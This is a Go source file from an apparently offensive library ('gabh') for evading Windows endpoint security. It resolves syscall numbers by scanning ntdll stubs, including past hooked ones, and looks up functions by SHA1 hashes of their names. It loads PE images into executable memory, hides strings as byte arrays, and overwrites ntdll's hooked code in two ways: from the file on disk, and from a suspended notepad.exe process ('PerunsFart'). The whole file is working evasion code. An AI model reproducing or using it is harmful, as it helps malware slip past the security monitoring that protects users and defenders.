package gabh

import (
	"bytes"
	"crypto/sha1"
	"encoding/binary"
	"errors"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"github.com/Binject/debug/pe"
	"github.com/awgh/rawreader"
	"golang.org/x/sys/windows"
)

func (l *Library) UniversalFindProc(funcname string) (uintptr, error) {
	v, ok := l.Exports[strings.ToLower(funcname)]
	if !ok {
		return 0, errors.New("Call did not find export " + funcname)
	}
	return l.BaseAddress + uintptr(v), nil
}

// FindProc - returns the address of the given function in this library
func (l *Library) FindProc(funcname string) (uintptr, bool) {
	v, ok := l.Exports[funcname]
	return l.BaseAddress + uintptr(v), ok
}

func Universal(hash func(string) string) (*Library, error) {
	l := string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) + string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})
	image, err := ioutil.ReadFile(l)
	if err != nil {
		return nil, err
	}
	library, err := LoadLibraryImpl(&image, hash)
	if err != nil {
		return nil, err
	}
	library.Name = string([]byte{'n', 't', 'd', 'l', 'l'})
	return library, nil
}

// LoadLibraryImpl - loads a single library to memory, without trying to check or load required imports
func LoadLibraryImpl(image *[]byte, hash func(string) string) (*Library, error) {
	const PtrSize = 32 << uintptr(^uintptr(0)>>63) // are we on a 32bit or 64bit system?
	pelib, err := pe.NewFile(bytes.NewReader(*image))
	if err != nil {
		return nil, err
	}
	pe64 := pelib.Machine == pe.IMAGE_FILE_MACHINE_AMD64
	if pe64 && PtrSize != 64 {
		return nil, errors.New("Cannot load a 64bit DLL from a 32bit process")
	} else if !pe64 && PtrSize != 32 {
		return nil, errors.New("Cannot load a 32bit DLL from a 64bit process")
	}

	var sizeOfImage uint32
	if pe64 {
		sizeOfImage = pelib.OptionalHeader.(*pe.OptionalHeader64).SizeOfImage
	} else {
		sizeOfImage = pelib.OptionalHeader.(*pe.OptionalHeader32).SizeOfImage
	}
	r, err := vA(0, sizeOfImage, MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return nil, err
	}
	dst, err := vA(r, sizeOfImage, MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)

	if err != nil {
		return nil, err
	}

	//perform base relocations
	pelib.Relocate(uint64(dst), image)

	//write to memory
	CopySections(pelib, image, dst)

	exports, err := pelib.Exports()
	if err != nil {
		return nil, err
	}
	lib := Library{
		BaseAddress: dst,
		Exports:     make(map[string]uint64),
	}
	for _, x := range exports {
		lib.Exports[hash(x.Name)] = uint64(x.VirtualAddress)
		lib.Exports[hash(strings.ToLower(x.Name))] = uint64(x.VirtualAddress)
	}

	return &lib, nil
}

// CopySections - writes the sections of a PE image to the given base address in memory
func CopySections(pefile *pe.File, image *[]byte, loc uintptr) error {
	// Copy Headers
	var sizeOfHeaders uint32
	if pefile.Machine == pe.IMAGE_FILE_MACHINE_AMD64 {
		sizeOfHeaders = pefile.OptionalHeader.(*pe.OptionalHeader64).SizeOfHeaders
	} else {
		sizeOfHeaders = pefile.OptionalHeader.(*pe.OptionalHeader32).SizeOfHeaders
	}
	hbuf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(loc)))
	for index := uint32(0); index < sizeOfHeaders; index++ {
		hbuf[index] = (*image)[index]
	}

	// Copy Sections
	for _, section := range pefile.Sections {
		//fmt.Println("Writing:", fmt.Sprintf("%s %x %x", section.Name, loc, uint32(loc)+section.VirtualAddress))
		if section.Size == 0 {
			continue
		}
		d, err := section.Data()
		if err != nil {
			return err
		}
		dataLen := uint32(len(d))
		dst := uint64(loc) + uint64(section.VirtualAddress)
		buf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(dst)))
		for index := uint32(0); index < dataLen; index++ {
			buf[index] = d[index]
		}
	}

	// Write symbol and string tables
	bbuf := bytes.NewBuffer(nil)
	binary.Write(bbuf, binary.LittleEndian, pefile.COFFSymbols)
	binary.Write(bbuf, binary.LittleEndian, pefile.StringTable)
	b := bbuf.Bytes()
	blen := uint32(len(b))
	for index := uint32(0); index < blen; index++ {
		hbuf[index+pefile.FileHeader.PointerToSymbolTable] = b[index]
	}

	return nil
}

func vA(addr uintptr, size, allocType, protect uint32) (uintptr, error) {
	procVA := syscall.MustLoadDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).MustFindProc(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c'}))
	r1, _, e1 := procVA.Call(
		addr,
		uintptr(size),
		uintptr(allocType),
		uintptr(protect))

	if int(r1) == 0 {
		return r1, os.NewSyscallError(string([]byte{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c'}), e1)
	}
	return r1, nil
}

func ReMapNtdll() (*unNtd, error) {
	var uNTD = &unNtd{}

	//ntcreatefile = ac19c01d8c27c421e0b8a7960ae6bad2f84f0ce5
	NCF_ptr, _, e := GetFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "ac19c01d8c27c421e0b8a7960ae6bad2f84f0ce5", str2sha1)
	if e != nil {
		fmt.Println(e)
		return uNTD, fmt.Errorf("NtCreateFile Err")
	}

	var hNtdllfile uintptr

	ntPathW := "\\??\\C:\\Windows\\System32\\" + string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})
	ntPath, _ := windows.NewNTUnicodeString(ntPathW)

	objectAttributes := windows.OBJECT_ATTRIBUTES{}
	objectAttributes.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
	objectAttributes.ObjectName = ntPath

	var ioStatusBlock windows.IO_STATUS_BLOCK

	//status = NtCreateFile(&handleNtdllDisk, FILE_READ_ATTRIBUTES | GENERIC_READ | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, 0, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	syscall.Syscall12(uintptr(NCF_ptr), 11, uintptr(unsafe.Pointer(&hNtdllfile)), uintptr(0x80|syscall.GENERIC_READ|syscall.SYNCHRONIZE), uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&ioStatusBlock)), 0, 0, syscall.FILE_SHARE_READ, uintptr(0x00000001), uintptr(0x00000040|0x00000020), 0, 0, 0)

	//ntcreatesection = 747d342b80e4c1c9d4d3dcb4ee2da24dcce27801
	NCS_ptr, _, _ := GetFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "747d342b80e4c1c9d4d3dcb4ee2da24dcce27801", str2sha1)

	var handleNtdllSection uintptr
	//status = NtCreateSection(&handleNtdllSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, handleNtdllDisk);
	syscall.Syscall9(uintptr(NCS_ptr), 7, uintptr(unsafe.Pointer(&handleNtdllSection)), uintptr(0x000F0000|0x4|0x1), 0, 0, syscall.PAGE_READONLY, uintptr(0x1000000), hNtdllfile, 0, 0)

	//zwmapviewofsection = da39da04447a22b747ac8e86b4773bbd6ea96f9b
	ZMVS_ptr, _, _ := GetFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "da39da04447a22b747ac8e86b4773bbd6ea96f9b", str2sha1)

	var unhookedBaseAddress uintptr
	var size uintptr
	//status = NtMapViewOfSection(handleNtdllSection, NtCurrentProcess(), &unhookedNtdllBaseAddress, 0, 0, 0, &size, ViewShare, 0, PAGE_READONLY);
	syscall.Syscall12(uintptr(ZMVS_ptr), 10, handleNtdllSection, uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&unhookedBaseAddress)), 0, 0, 0, uintptr(unsafe.Pointer(&size)), 1, 0, syscall.PAGE_READONLY, 0, 0)

	uNTD.pModule = unhookedBaseAddress
	uNTD.size = size
	return uNTD, nil

}

//returns a pointer to the function (Virtual Address)
func (u *unNtd) GetFuncUnhook(funcnamehash string, hash func(string) string) (uint64, string, error) {
	rr := rawreader.New(u.pModule, int(u.size))
	p, e := pe.NewFileFromMemory(rr)
	if e != nil {
		return 0, "", e
	}

	ex, e := p.Exports()
	if e != nil {
		return 0, "", e
	}

	for _, exp := range ex {
		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcnamehash) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcnamehash) {
			return uint64(u.pModule) + uint64(exp.VirtualAddress), exp.Name, nil
		}
	}
	return 0, "", fmt.Errorf("could not find function!!! ")
}

func dllExports(dllname string) (*pe.File, error) {
	l := string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) + dllname
	p, e := pe.Open(l)
	if e != nil {
		return nil, e
	}
	return p, nil
}

func UTF16PtrFromString(s string) (*uint16, error) {
	a, err := UTF16FromString(s)
	if err != nil {
		return nil, err
	}
	return &a[0], nil
}

func UTF16FromString(s string) ([]uint16, error) {
	for i := 0; i < len(s); i++ {
		if s[i] == 0 {
			return nil, syscall.EINVAL
		}
	}
	return utf16.Encode([]rune(s + "\x00")), nil
}

//GetFuncPtr returns a pointer to the function (Virtual Address)
func GetFuncPtr(moduleName string, funcnamehash string, hash func(string) string) (uint64, string, error) {
	//Get dll module BaseAddr
	k32 := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'}))
	GMEx := k32.NewProc(string([]byte{'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'E', 'x', 'W'}))
	var phModule uintptr
	cname, _ := UTF16PtrFromString(moduleName)
	r1, _, err := GMEx.Call(0, uintptr(unsafe.Pointer(cname)), uintptr(unsafe.Pointer(&phModule)))
	if r1 != 1 || phModule == 0 {
		syscall.LoadLibrary(moduleName)
		r1, _, err = GMEx.Call(0, uintptr(unsafe.Pointer(cname)), uintptr(unsafe.Pointer(&phModule)))
		if r1 != 1 || phModule == 0 {
			return 0, "", err
		}
	}
	//get dll exports
	pef, err := dllExports(moduleName)
	if err != nil {
		return 0, "", err
	}
	ex, err := pef.Exports()
	if err != nil {
		return 0, "", err
	}

	for _, exp := range ex {
		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcnamehash) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcnamehash) {
			return uint64(phModule) + uint64(exp.VirtualAddress), exp.Name, nil
		}
	}
	return 0, "", fmt.Errorf("could not find function!!! ")
}

//NtdllHgate takes the exported syscall name and gets the ID it refers to. This function will access the ntdll file _on disk_, and relevant events/logs will be generated for those actions.
func NtdllHgate(funcname string, hash func(string) string) (uint16, error) {
	return getSysIDFromDisk(funcname, hash)
}

//getSysIDFromMemory takes values to resolve, and resolves from disk.
func getSysIDFromDisk(funcname string, hash func(string) string) (uint16, error) {
	l := string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})
	p, e := pe.Open(l)
	if e != nil {
		return 0, e
	}
	ex, e := p.Exports()
	for _, exp := range ex {
		if strings.ToLower(hash(exp.Name)) == strings.ToLower(funcname) || strings.ToLower(hash(strings.ToLower(exp.Name))) == strings.ToLower(funcname) {
			offset := rvaToOffset(p, exp.VirtualAddress)
			b, e := p.Bytes()
			if e != nil {
				return 0, e
			}
			buff := b[offset : offset+10]

			// First opcodes should be :
			//    MOV R10, RCX
			//    MOV RAX, <syscall>
			if buff[0] == 0x4c &&
				buff[1] == 0x8b &&
				buff[2] == 0xd1 &&
				buff[3] == 0xb8 &&
				buff[6] == 0x00 &&
				buff[7] == 0x00 {
				return sysIDFromRawBytes(buff)
			}

			//if hooked check the neighborhood to find clean syscall
			if buff[0] == 0xe9 {
				for idx := uintptr(1); idx <= 500; idx++ {
					// check neighboring syscall down
					if *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[0])) + idx*IDX)) == 0x4c &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[1])) + idx*IDX)) == 0x8b &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[2])) + idx*IDX)) == 0xd1 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[3])) + idx*IDX)) == 0xb8 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[6])) + idx*IDX)) == 0x00 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[7])) + idx*IDX)) == 0x00 {
						buff[4] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[4])) + idx*IDX))
						buff[5] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[5])) + idx*IDX))
						return Uint16Down(buff[4:8], uint16(idx)), nil
					}

					// check neighboring syscall up
					if *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[0])) - idx*IDX)) == 0x4c &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[1])) - idx*IDX)) == 0x8b &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[2])) - idx*IDX)) == 0xd1 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[3])) - idx*IDX)) == 0xb8 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[6])) - idx*IDX)) == 0x00 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[7])) - idx*IDX)) == 0x00 {
						buff[4] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[4])) - idx*IDX))
						buff[5] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[5])) - idx*IDX))
						return Uint16Up(buff[4:8], uint16(idx)), nil
					}
				}
			}
			if buff[3] == 0xe9 {
				for idx := uintptr(1); idx <= 500; idx++ {
					// check neighboring syscall down
					if *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[0])) + idx*IDX)) == 0x4c &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[1])) + idx*IDX)) == 0x8b &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[2])) + idx*IDX)) == 0xd1 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[3])) + idx*IDX)) == 0xb8 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[6])) + idx*IDX)) == 0x00 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[7])) + idx*IDX)) == 0x00 {
						buff[4] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[4])) + idx*IDX))
						buff[5] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[5])) + idx*IDX))
						return Uint16Down(buff[4:8], uint16(idx)), nil
					}

					// check neighboring syscall up
					if *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[0])) - idx*IDX)) == 0x4c &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[1])) - idx*IDX)) == 0x8b &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[2])) - idx*IDX)) == 0xd1 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[3])) - idx*IDX)) == 0xb8 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[6])) - idx*IDX)) == 0x00 &&
						*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[7])) - idx*IDX)) == 0x00 {
						buff[4] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[4])) - idx*IDX))
						buff[5] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&buff[5])) - idx*IDX))
						return Uint16Up(buff[4:8], uint16(idx)), nil
					}
				}
			}
			return 0, errors.New("Could not find sID")
		}
	}
	return 0, errors.New("Could not find sID")
}

//rvaToOffset converts an RVA value from a PE file into the file offset. When using binject/debug, this should work fine even with in-memory files.
func rvaToOffset(pefile *pe.File, rva uint32) uint32 {
	for _, hdr := range pefile.Sections {
		baseoffset := uint64(rva)
		if baseoffset > uint64(hdr.VirtualAddress) &&
			baseoffset < uint64(hdr.VirtualAddress+hdr.VirtualSize) {
			return rva - hdr.VirtualAddress + hdr.Offset
		}
	}
	return rva
}

//sysIDFromRawBytes takes a byte slice and determines if there is a sysID in the expected location. Returns a MayBeHookedError if the signature does not match.
func sysIDFromRawBytes(b []byte) (uint16, error) {
	return binary.LittleEndian.Uint16(b[4:8]), nil
}

func Uint16Down(b []byte, idx uint16) uint16 {
	_ = b[1] // bounds check hint to compiler; see golang.org/issue/14808
	return uint16(b[0]) - idx | uint16(b[1])<<8
}
func Uint16Up(b []byte, idx uint16) uint16 {
	_ = b[1] // bounds check hint to compiler; see golang.org/issue/14808
	return uint16(b[0]) + idx | uint16(b[1])<<8
}

//HgSyscall calls the system function specified by callid with n arguments. Works much the same as syscall.Syscall - return value is the call error code and optional error text. All args are uintptrs to make it easy.
func HgSyscall(callid uint16, argh ...uintptr) (errcode uint32, err error) {
	errcode = hgSyscall(callid, argh...)

	if errcode != 0 {
		err = fmt.Errorf("non-zero return from syscall")
	}
	return errcode, err
}

func FullUnhook(DLLname []string) error {

	//get customsyscall
	//todo: change registry ops into syscall
	var customsyscall uint16
	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, string([]byte{'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}), registry.QUERY_VALUE)
	CurrentVersion, _, _ := regkey.GetStringValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}))
	MajorVersion, _, err := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'a', 'j', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
	if err == nil {
		MinorVersion, _, _ := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'i', 'n', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
	}
	regkey.Close()

	if CurrentVersion == "10.0" {
		customsyscall = 0x50
	} else {
		return nil
	}

	for _, d := range DLLname {
		dll, err := ioutil.ReadFile(d)
		if err != nil {
			return err
		}
		file, error1 := pe.Open(d)
		if error1 != nil {
			return error1
		}
		x := file.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
		bytes := dll[x.Offset:x.Size]
		loaddll, error2 := windows.LoadDLL(d)
		if error2 != nil {
			return error2
		}
		handle := loaddll.Handle
		dllBase := uintptr(handle)
		dllOffset := uint(dllBase) + uint(x.VirtualAddress)
		var oldfartcodeperms uintptr
		regionsize := uintptr(len(bytes))
		handlez := uintptr(0xffffffffffffffff)
		runfunc, _ := npvm(
			customsyscall,
			handlez,
			(*uintptr)(unsafe.Pointer(&dllOffset)),
			&regionsize,
			syscall.PAGE_EXECUTE_READWRITE,
			&oldfartcodeperms,
		)
		if runfunc != 0 {
		}

		for i := 0; i < len(bytes); i++ {
			loc := uintptr(dllOffset + uint(i))
			mem := (*[1]byte)(unsafe.Pointer(loc))
			(*mem)[0] = bytes[i]
		}

		runfunc, _ = npvm(
			customsyscall,
			handlez,
			(*uintptr)(unsafe.Pointer(&dllOffset)),
			&regionsize,
			oldfartcodeperms,
			&oldfartcodeperms,
		)
		if runfunc != 0 {
		}
	}
	return nil
}

func npvm(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) (uint32, error) {
	return ntP(
		sysid,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		NewProtect,
		uintptr(unsafe.Pointer(oldprotect)),
	)
}

//Perun's Fart unhook function
//todo: change syscall package into gabh
func PerunsFart() error {

	//get customsyscall
	//todo: change registry ops into syscall
	var customsyscall uint16
	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, string([]byte{'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}), registry.QUERY_VALUE)
	CurrentVersion, _, _ := regkey.GetStringValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}))
	MajorVersion, _, err := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'a', 'j', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
	if err == nil {
		MinorVersion, _, _ := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'i', 'n', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
	}
	regkey.Close()

	if CurrentVersion == "10.0" {
		customsyscall = 0x50
	} else {
		return fmt.Errorf("winver low")
	}

	//create suspended new process
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(syscall.StartupInfo{}))

	target := "C:\\Windows\\System32\\notepad.exe"
	//target := os.args[0]

	cmdline, err := syscall.UTF16PtrFromString(target)
	if err != nil {
		panic(err)
	}

	err = syscall.CreateProcess(
		nil,
		cmdline,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		return err
	}

	fmt.Println("Start Suspended Notepad.exe and Sleep 5s pid: " + strconv.Itoa(int(pi.ProcessId)))

	windows.SleepEx(5000, false)

	//get ntdll handler
	GetModuleHandleA := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc("GetModuleHandleA")
	bytes0 := []byte(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
	Ntdll, _, _ := GetModuleHandleA.Call(uintptr(unsafe.Pointer(&bytes0[0])))
	if Ntdll == 0 {
		return fmt.Errorf("err GetModuleHandleA")
	}

	moduleInfo := windows.ModuleInfo{}

	curr, _ := syscall.GetCurrentProcess()
	if curr == 0 {
		return fmt.Errorf("err GetCurrentProcess")
	}

	err = windows.GetModuleInformation(windows.Handle(uintptr(curr)), windows.Handle(Ntdll), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
	if err != nil {
		return err
	}

	addrMod := moduleInfo.BaseOfDll

	//get ntheader of ntdll
	ntHeader := ntH(addrMod)
	if ntHeader == nil {
		return fmt.Errorf("get ntHeader err")
	}

	windows.SleepEx(50, false)

	//get module size of ntdll
	modSize := ntHeader.OptionalHeader.SizeOfImage
	if modSize == 0 {
		return fmt.Errorf("get module size err")
	}
	//fmt.Println("ntdll module size: " + strconv.Itoa(int(modSize)))

	cache := make([]byte, modSize)

	//read clean ntdll from new process
	//todo: change readprocessmemory into Nt api
	err = windows.ReadProcessMemory(windows.Handle(uintptr(pi.Process)), addrMod, &cache[0], uintptr(modSize), nil)
	if err != nil {
		return err
	}
	e := syscall.TerminateProcess(pi.Process, 0)
	if e != nil {
		return e
	}

	fmt.Println("Terminate Suspended Process...")

	windows.SleepEx(50, false)

	dll := cache
	if err != nil {
		return err
	}

	//parsing buff into pe format
	file, error1 := pe.NewFileFromMemory(bytes.NewReader(cache))
	if error1 != nil {
		return error1
	}

	//check out the .text section offset
	x := file.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
	bytes := dll[x.Offset:x.Size]
	dllBase := Ntdll
	dllOffset := uint(dllBase) + uint(x.VirtualAddress)
	var oldfartcodeperms uintptr
	regionsize := uintptr(len(bytes))
	handlez := uintptr(0xffffffffffffffff)

	runfunc, _ := npvm(
		customsyscall,
		handlez,
		(*uintptr)(unsafe.Pointer(&dllOffset)),
		&regionsize,
		syscall.PAGE_EXECUTE_READWRITE,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
	}

	for i := 0; i < len(bytes); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = bytes[i]
	}
	//fmt.Println("Unhooked Ntdll...")

	runfunc, _ = npvm(
		customsyscall,
		handlez,
		(*uintptr)(unsafe.Pointer(&dllOffset)),
		&regionsize,
		oldfartcodeperms,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
	}
	return nil
}

func ntH(baseAddress uintptr) *IMAGE_NT_HEADERS {
	return (*IMAGE_NT_HEADERS)(unsafe.Pointer(baseAddress + uintptr((*IMAGE_DOS_HEADER)(unsafe.Pointer(baseAddress)).E_lfanew)))
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func ntP(callid uint16, argh ...uintptr) (errcode uint32, err error)

//Syscall calls the system function specified by callid with n arguments. Works much the same as syscall.Syscall - return value is the call error code and optional error text. All args are uintptrs to make it easy.
func hgSyscall(callid uint16, argh ...uintptr) (errcode uint32)
